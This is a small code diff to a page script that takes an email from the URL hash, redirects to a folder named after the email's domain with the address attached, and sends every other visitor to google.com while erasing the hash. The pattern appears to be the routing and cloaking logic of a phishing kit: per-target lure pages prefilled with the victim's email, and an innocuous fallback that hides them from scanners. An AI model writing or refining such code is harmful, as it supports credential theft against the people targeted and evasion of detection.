@@ -6,28 +6,26 @@
     const domain = email.split("@")[1];
     const folder = domain.split(".")[0];
 
-    // Try to load the folder's index.html directly
+    // Try to fetch index.html inside the folder
     fetch(`./${folder}/index.html`, { method: 'HEAD' })
       .then(res => {
         if (res.ok) {
-          // Folder exists, redirect
-          window.location.replace(`./${folder}/#$email`);
+          // Folder exists — redirect with original email hash (unencoded)
+          window.location.replace(`./${folder}/#${email}`);
         } else {
-          // Folder does not exist, redirect to Google
+          // Folder not found — fallback
           window.location.replace("https://google.com");
         }
       })
       .catch(() => {
-        // Error fetching, redirect to Google
+        // Error — fallback
         window.location.replace("https://google.com");
       });
 
-    // Optional: Remove the hash from URL
+    // Clean the hash from the original URL
     history.replaceState(null, null, window.location.pathname + window.location.search);
-
   } else {
-    // No valid email, redirect to Google
+    // Invalid or missing email — fallback
     window.location.replace("https://google.com");
   }
 </script>
-
